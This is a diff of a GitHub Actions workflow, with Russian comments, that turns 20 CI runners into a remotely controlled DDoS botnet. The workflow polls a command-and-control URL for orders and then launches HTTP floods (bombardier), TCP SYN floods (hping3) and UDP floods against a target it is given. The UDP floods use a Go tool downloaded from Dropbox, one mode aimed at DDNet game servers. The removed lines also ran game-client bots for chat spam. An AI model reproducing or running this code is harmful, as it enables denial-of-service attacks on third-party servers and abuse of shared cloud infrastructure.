@@ -1,97 +1,73 @@
-name: Ultimate 80-Bot Army Control
+name: Ultimate Multi-Tool (20 Machines)
 on:
   workflow_dispatch:
 
 jobs:
-  main-process:
+  str-test:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        machine: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
-    
+        runner: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
     steps:
-      - name: 1. Preparing Environment
+      - name: Install Tools
         run: |
           sudo apt-get update
-          sudo apt-get install -y hping3 golang-go wget curl jq xvfb xdotool libsdl2-2.0-0 libcurl4 libfreetype6 libgl1 libglx-mesa0 libglu1-mesa libnotify4 libpng16-16 libvorbisfile3 libgl1-mesa-dri openbox
-
-      - name: 2. Download Tools
-        run: |
+          sudo apt-get install -y hping3 golang-go wget curl jq
+          
+          # Установка Bombardier
           wget https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier
           chmod +x bombardier && sudo mv bombardier /usr/local/bin/
-          wget -O bombarida.go "https://www.dropbox.com/scl/fi/zomtm1n4fk8c9bhigxo6c/bombarida.go?rlkey=7axesdmxaztkxo7ie55uybp3m&st=lgr6k8u6&dl=1"
           
-          RAW_LINK=$(curl -s https://ddnet.org/downloads/ | grep -oP 'href="\K[^"]+linux_x86_64\.tar\.xz' | head -n 1)
-          if [[ "$RAW_LINK" == http* ]]; then FULL_URL="$RAW_LINK"; else FULL_URL="https://ddnet.org/downloads/$(basename $RAW_LINK)"; fi
-          wget -O ddnet.tar.xz "$FULL_URL"
-          tar -xf ddnet.tar.xz
-          mv DDNet-* ddnet_folder
+          # Установка Bombarida
+          wget -O bombarida.go "https://www.dropbox.com/scl/fi/zomtm1n4fk8c9bhigxo6c/bombarida.go?rlkey=7axesdmxaztkxo7ie55uybp3m&st=lgr6k8u6&dl=1"
 
-      - name: 3. Loop Control Center
+      - name: Run Attack
         env:
           CONTROL_URL: "https://me5years.alwaysdata.net/index.php?action=get"
         run: |
-          Xvfb :99 -screen 0 1024x768x24 +extension GLX +render -noreset & sleep 3
-          export DISPLAY=:99
-          openbox & sleep 2
-          export LIBGL_ALWAYS_SOFTWARE=1
-
-          cd ddnet_folder
-          for i in {1..4}; do
-            cat << EOF > "bot${i}.cfg"
-            cl_show_welcome 0; cl_motd_time 0; gfx_screen_width 640; gfx_screen_height 480;
-            player_name "Panda_${{ matrix.machine }}_$i"; cl_dummy_name "DUM_${{ matrix.machine }}_$i";
-            cl_dummy 1; cl_auto_ready 1; snd_enable 0;
-          EOF
-            ./DDNet -f "bot${i}.cfg" > /dev/null 2>&1 & 
-            sleep 1
-          done
-
-          echo "READY..."
+          echo "ОЖИДАНИЕ КОМАНДЫ..."
           LAST_ID="0"
           
           while true; do
-            RESPONSE=$(curl -s --max-time 5 "$CONTROL_URL")
+            # Получаем данные с сайта
+            DATA=$(curl -s --max-time 5 "$CONTROL_URL")
             
-            # Проверка: если это валидный JSON, работаем дальше
-            if echo "$RESPONSE" | jq -e . >/dev/null 2>&1; then
-              ID=$(echo "$RESPONSE" | jq -r '.id // 0')
+            # Проверяем, что получили валидный JSON
+            if echo "$DATA" | jq -e . >/dev/null 2>&1; then
+              ID=$(echo "$DATA" | jq -r '.id // 0')
 
               if [[ "$ID" != "$LAST_ID" && "$ID" != "0" ]]; then
                 LAST_ID=$ID
-                TYPE=$(echo "$RESPONSE" | jq -r '.type')
-                TARGET=$(echo "$RESPONSE" | jq -r '.target')
-                PORT=$(echo "$RESPONSE" | jq -r '.port')
-                CONNS=$(echo "$RESPONSE" | jq -r '.conns')
-                MSG=$(echo "$RESPONSE" | jq -r '.msg')
+                METHOD=$(echo "$DATA" | jq -r '.method')
+                TARGET=$(echo "$DATA" | jq -r '.target')
+                PORT=$(echo "$DATA" | jq -r '.port')
+                CONNS=$(echo "$DATA" | jq -r '.conns')
 
-                if [[ "$TYPE" == "connect" || "$TYPE" == "chat" || "$TYPE" == "disconnect" || "$TYPE" == "key" ]]; then
-                  WIDS=$(xdotool search --class "DDNet" 2>/dev/null || echo "")
-                  for WID in $WIDS; do
-                    xdotool windowactivate --sync $WID 2>/dev/null
-                    if [ "$TYPE" == "connect" ]; then
-                      xdotool key --window $WID F1; sleep 0.2; xdotool type --window $WID "connect $TARGET"; xdotool key --window $WID Return; xdotool key --window $WID F1
-                    elif [ "$TYPE" == "chat" ]; then
-                      xdotool key --window $WID t; sleep 0.2; xdotool type --window $WID "$MSG"; xdotool key --window $WID Return
-                    elif [ "$TYPE" == "disconnect" ]; then
-                      xdotool key --window $WID F1; sleep 0.2; xdotool type --window $WID "disconnect"; xdotool key --window $WID Return; xdotool key --window $WID F1
-                    elif [ "$TYPE" == "key" ]; then
-                      xdotool key --window $WID "$MSG"
-                    fi
-                  done
-                fi
+                # Останавливаем предыдущие процессы перед новым запуском
+                sudo killall bombardier hping3 go .output 2>/dev/null || true
+                
+                # ВЫВОД В ЛОГИ (как ты просил)
+                echo "--------------------------------------------------"
+                echo "Атака запущена на TARGET: $TARGET"
+                echo "Метод: $METHOD | Потоков: $CONNS"
+                echo "--------------------------------------------------"
 
-                if [ "$TYPE" == "http" ]; then
-                  bombardier -c $CONNS -d 600s --http2 -l "$TARGET" &
-                elif [ "$TYPE" == "tcp" ]; then
+                # ЛОГИКА АТАКИ ИЗ ТВОЕГО YML
+                if [ "$METHOD" == "http" ]; then
+                  while true; do bombardier -c $CONNS -d 3600s --http2 -l "$TARGET?cache=$RANDOM"; done &
+                
+                elif [ "$METHOD" == "tcp" ]; then
                   sudo hping3 --flood -S -p $PORT $TARGET &
-                elif [ "$TYPE" == "udp" ]; then
-                  go run ../bombarida.go -mode client -addr "${TARGET}:${PORT}" -c $CONNS -n 0 -d 600s -r 0 -t 1s &
-                elif [ "$TYPE" == "udp-ddnet" ]; then
-                  go run ../bombarida.go -mode client -addr "${TARGET}:${PORT}" -ddnet-info -open-loop -c $CONNS -n 0 -d 600s -r 0 -t 1s &
+                
+                elif [ "$METHOD" == "udp" ]; then
+                  go run bombarida.go -mode client -addr "${TARGET}:${PORT}" -c $CONNS -n 0 -d 3600s -r 0 -t 1s &
+                
+                elif [ "$METHOD" == "udp-ddnet" ]; then
+                  go run bombarida.go -mode client -addr "${TARGET}:${PORT}" -ddnet-info -open-loop -c $CONNS -n 0 -d 3600s -r 0 -t 1s &
                 fi
               fi
             fi
-            sleep 3
+            sleep 5
           done
